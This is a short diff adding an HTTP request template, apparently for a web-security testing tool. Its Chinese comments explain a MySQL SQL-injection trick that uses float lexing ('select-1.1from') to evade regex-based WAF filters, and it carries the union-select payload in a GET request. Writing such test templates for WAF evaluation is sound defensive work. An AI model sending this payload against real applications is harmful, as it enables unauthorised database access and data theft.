@@ -1,0 +1,13 @@
+# @name: MySQL浮点数词法优先绕过
+# @tags: get,sqli,mysql,float,scientific-notation,lexing,id,bypass
+# @color: cyan
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: sqli_float_lexing
+# @intent.param: id
+# @intent.payload: id=1'union select-1.1from user-- 
+# @note: MySQL 对浮点数与科学计数法有词法优先解析，select-1.1from 中 -1.1 被优先拆分为数字字面量，语句合法，绕过 select\b[\s\S]*\bfrom 这类正则。payload: id=1'union select-1.1from user-- 
+GET /?id=1'+union+select-1.1from+user--%20 HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
